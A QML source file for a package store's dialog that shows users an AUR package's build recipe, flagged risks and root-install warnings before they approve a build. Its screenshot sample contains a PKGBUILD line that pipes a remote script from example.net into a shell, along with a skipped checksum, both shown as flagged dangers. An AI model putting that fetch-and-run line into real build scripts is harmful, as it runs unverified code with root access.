import QtQuick
import QtQuick.Controls
import QtQuick.Layouts

// The step between "Install" on an AUR package and the build: one window per package,
// nothing is built until the person ticks the box. Closing the window cancels the whole install.
Window {
    id: dialog
    Shortcut { sequences: [StandardKey.Cancel]; onActivated: dialog.close() }  // Escape, as a QDialog
    required property var review
    property var sample: null  // A review shown without the AUR, for screenshots (WOOFSTORE_PREVIEW contains "aur-sample")
    readonly property var shown: sample ?? (review.review === "" ? null : JSON.parse(review.review))

    title: shown ? "Review " + shown.who : "Review before building"
    flags: Qt.Dialog
    modality: Qt.WindowModal
    width: 820
    height: 640
    color: palette.window
    visible: shown !== null
    onShownChanged: understood.checked = false
    onClosing: { sample = null; review.cancel() }

    Connections {
        target: dialog.transientParent
        function onPreviewChanged() {
            if (!dialog.transientParent.preview.split(",").includes("aur-sample")) return
            dialog.sample = {
                who: "demo-bin",
                facts: "Package: demo-bin\nMaintainer: someone\nVotes: 42 · popularity 1.23\nFirst submitted: 2024-03-02\nLast updated: 2026-10-01",
                flags: ["demo.install is an install script. pacman runs it as root when the package is installed.",
                        "PKGBUILD:13 downloads something with curl or wget: curl -fsSL http://example.net/setup.sh | sh",
                        "PKGBUILD:13 pipes data into a shell: curl -fsSL http://example.net/setup.sh | sh",
                        "1 checksum(s) are SKIP for files that are not a git checkout: those downloads are not verified."],
                text: "\n──── PKGBUILD ────\npkgname=demo-bin\npkgver=1.4.2\npkgrel=1\npkgdesc=\"A demo application\"\narch=('x86_64')\nurl=\"https://example.org/demo\"\nlicense=('MIT')\ndepends=('gtk3' 'libdemo')\nsource=(\"https://example.org/demo/releases/demo-$pkgver.tar.gz\")\nsha256sums=('SKIP')\n\npackage() {\n  curl -fsSL http://example.net/setup.sh | sh\n  install -Dm755 demo \"$pkgdir/usr/bin/demo\"\n}\n\n──── demo.install ────\npost_install() {\n  echo \"Run demo --setup once.\"\n}\n",
                needs: ["libdemo"]
            }
            dialog.transientParent.shotTarget = dialog
        }
    }

    // Breeze's dialog margins and spacing
    ColumnLayout {
        anchors.fill: parent
        anchors.margins: 10
        spacing: 6

        Label {
            Layout.fillWidth: true
            wrapMode: Text.Wrap
            text: "AUR packages are recipes written by community members. Nobody at Arch or CachyOS checks them. Read the recipe below before building."
        }
        Label {
            Layout.fillWidth: true
            wrapMode: Text.Wrap
            textFormat: Text.PlainText
            text: dialog.shown ? dialog.shown.facts + (dialog.shown.needs.length ? "\n\nNeeds these packages from the AUR, reviewed next: " + dialog.shown.needs.join(", ") : "") : ""
        }
        Label {
            Layout.fillWidth: true
            wrapMode: Text.Wrap
            textFormat: Text.PlainText
            text: !dialog.shown ? "" : dialog.shown.flags.length ? "Read these twice:\n• " + dialog.shown.flags.join("\n• ") : "No lines matched the store's checklist. That does not mean the recipe is safe."
        }
        // A QPlainTextEdit: the base colour in Breeze's rounded frame, text 6 px in (2 px frame, 4 px document margin)
        ScrollView {
            Layout.fillWidth: true
            Layout.fillHeight: true
            background: Rectangle { radius: 5; color: palette.base }
            TextArea {
                background: null
                padding: 6
                readOnly: true
                text: dialog.shown ? dialog.shown.text : ""
                textFormat: TextEdit.PlainText
                wrapMode: TextEdit.NoWrap
                // KDE's default fixed font (QFontDatabase::systemFont(FixedFont) has no QML equivalent outside Kirigami)
                font.family: "Hack"
            }
        }
        Label {
            Layout.fillWidth: true
            wrapMode: Text.Wrap
            text: "The build runs in a clean chroot, which keeps the build away from your files. It is not a security sandbox: the finished package is installed as root and its install scripts and programs run with full access to your system."
        }
        CheckBox { id: understood; text: "I read the recipe and the files it uses" }
        RowLayout {
            Layout.fillWidth: true
            Item { Layout.fillWidth: true }
            Button { text: "Cancel"; onClicked: dialog.close() }
            Button {
                text: "Build in clean chroot"
                enabled: understood.checked
                onClicked: dialog.sample ? dialog.sample = null : dialog.review.approve()
            }
        }
    }
}
